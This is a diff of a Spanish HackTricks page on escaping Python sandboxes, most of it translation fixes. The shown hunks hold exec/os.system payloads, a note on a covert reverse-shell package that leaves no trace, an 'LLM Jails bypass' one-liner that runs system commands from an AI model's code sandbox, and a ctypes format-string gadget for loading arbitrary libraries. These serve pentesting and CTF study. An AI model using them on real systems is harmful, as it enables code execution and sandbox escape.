@@ -15,15 +15,13 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
 **Obtén la perspectiva de un hacker sobre tus aplicaciones web, red y nube**
 
 **Encuentra e informa sobre vulnerabilidades críticas y explotables con un impacto real en el negocio.** Utiliza nuestras más de 20 herramientas personalizadas para mapear la superficie de ataque, encontrar problemas de seguridad que te permitan escalar privilegios y usar exploits automatizados para recopilar evidencia esencial, convirtiendo tu arduo trabajo en informes persuasivos.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
-
-
 
 Estos son algunos trucos para eludir las protecciones de sandbox de Python y ejecutar comandos arbitrarios.
 
@@ -107,16 +105,16 @@ Puedes descargar el paquete para crear el reverse shell aquí. Por favor, ten en
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-Este paquete se llama `Reverse`. Sin embargo, fue diseñado especialmente para que cuando salgas del reverse shell el resto de la instalación falle, así que **no dejarás ningún paquete de python extra instalado en el servidor** cuando te vayas.
+Este paquete se llama `Reverse`. Sin embargo, fue diseñado especialmente para que cuando salgas del reverse shell, el resto de la instalación falle, así que **no dejarás ningún paquete de python extra instalado en el servidor** cuando te vayas.
 {% endhint %}
 
 ## Eval-ing python code
 
 {% hint style="warning" %}
-Ten en cuenta que exec permite cadenas de varias líneas y ";", pero eval no (ver operador walrus)
+Ten en cuenta que exec permite cadenas de varias líneas y ";", pero eval no (ver operador morsa)
 {% endhint %}
 
-Si ciertos caracteres están prohibidos, puedes usar la representación **hex/octal/B64** para **bypassear** la restricción:
+Si ciertos caracteres están prohibidos, puedes usar la **representación hex/octal/B64** para **bypassear** la restricción:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -754,18 +752,22 @@ secret_variable = "clueless"
 x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
 str(x) # Out: clueless
 ```
-### De formato a RCE cargando bibliotecas
+### LLM Jails bypass
 
-Según el [**desafío TypeMonkey de este informe**](https://corgi.rip/posts/buckeye-writeups/), es posible cargar bibliotecas arbitrarias desde el disco abusando de la vulnerabilidad de cadena de formato en python.
+From [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
+
+### From format to RCE loading libraries
+
+According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) es posible cargar bibliotecas arbitrarias desde el disco abusando de la vulnerabilidad de formato de cadena en python.
 
 Como recordatorio, cada vez que se realiza una acción en python se ejecuta alguna función. Por ejemplo, `2*3` ejecutará **`(2).mul(3)`** o **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
 
-Tienes más como esto en la sección [**Ejecución de Python sin llamadas**](./#python-execution-without-calls).
+Tienes más como esto en la sección [**Python execution without calls**](./#python-execution-without-calls).
 
-Una vulnerabilidad de cadena de formato en python no permite ejecutar funciones (no permite usar paréntesis), por lo que no es posible obtener RCE como `'{0.system("/bin/sh")}'.format(os)`.\
+Una vulnerabilidad de formato de cadena en python no permite ejecutar funciones (no permite usar paréntesis), por lo que no es posible obtener RCE como `'{0.system("/bin/sh")}'.format(os)`.\
 Sin embargo, es posible usar `[]`. Por lo tanto, si una biblioteca común de python tiene un método **`__getitem__`** o **`__getattr__`** que ejecuta código arbitrario, es posible abusar de ellos para obtener RCE.
 
-Buscando un gadget así en python, el informe propone esta [**consulta de búsqueda en Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Donde encontró este [uno](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+Buscando un gadget así en python, el writeup propone esta [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Donde encontró este [uno](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -787,7 +789,7 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-Este gadget permite **cargar una biblioteca desde el disco**. Por lo tanto, es necesario de alguna manera **escribir o subir la biblioteca para cargarla** correctamente compilada en el servidor atacado.
+Este gadget permite **cargar una biblioteca desde el disco**. Por lo tanto, es necesario de alguna manera **escribir o subir la biblioteca para cargar** correctamente compilada en el servidor atacado.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
@@ -922,7 +924,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Nota que **si no puedes importar `dis` en el sandbox de python** puedes obtener el **bytecode** de la función (`get_flag.func_code.co_code`) y **desensamblarlo** localmente. No verás el contenido de las variables que se están cargando (`LOAD_CONST`), pero puedes inferirlas de (`get_flag.func_code.co_consts`) porque `LOAD_CONST` también indica el desplazamiento de la variable que se está cargando.
+Nota que **si no puedes importar `dis` en el sandbox de python** puedes obtener el **bytecode** de la función (`get_flag.func_code.co_code`) y **desensamblarlo** localmente. No verás el contenido de las variables que se están cargando (`LOAD_CONST`), pero puedes adivinarlo a partir de (`get_flag.func_code.co_consts`) porque `LOAD_CONST` también indica el desplazamiento de la variable que se está cargando.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -993,7 +995,7 @@ types.CodeType.__doc__
 ### Recreando una función filtrada
 
 {% hint style="warning" %}
-En el siguiente ejemplo, vamos a tomar todos los datos necesarios para recrear la función directamente del objeto de código de la función. En un **ejemplo real**, todos los **valores** para ejecutar la función **`code_type`** es lo que **necesitarás filtrar**.
+En el siguiente ejemplo, vamos a tomar todos los datos necesarios para recrear la función directamente del objeto de código de la función. En un **ejemplo real**, todos los **valores** para ejecutar la función **`code_type`** son lo que **necesitarás filtrar**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1007,7 +1009,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-En ejemplos anteriores al principio de esta publicación, puedes ver **cómo ejecutar cualquier código python usando la función `compile`**. Esto es interesante porque puedes **ejecutar scripts completos** con bucles y todo en una **línea** (y podríamos hacer lo mismo usando **`exec`**).\
+En los ejemplos anteriores al principio de esta publicación, puedes ver **cómo ejecutar cualquier código python usando la función `compile`**. Esto es interesante porque puedes **ejecutar scripts completos** con bucles y todo en una **línea** (y podríamos hacer lo mismo usando **`exec`**).\
 De todos modos, a veces podría ser útil **crear** un **objeto compilado** en una máquina local y ejecutarlo en la **máquina CTF** (por ejemplo, porque no tenemos la función `compiled` en el CTF).
 
 Por ejemplo, compilaremos y ejecutaremos manualmente una función que lee _./poc.py_:
@@ -1080,7 +1082,7 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
 **Obtén la perspectiva de un hacker sobre tus aplicaciones web, red y nube**
 
@@ -1098,7 +1100,7 @@ Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/grte.png" 
 
 * Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
 {% endhint %}
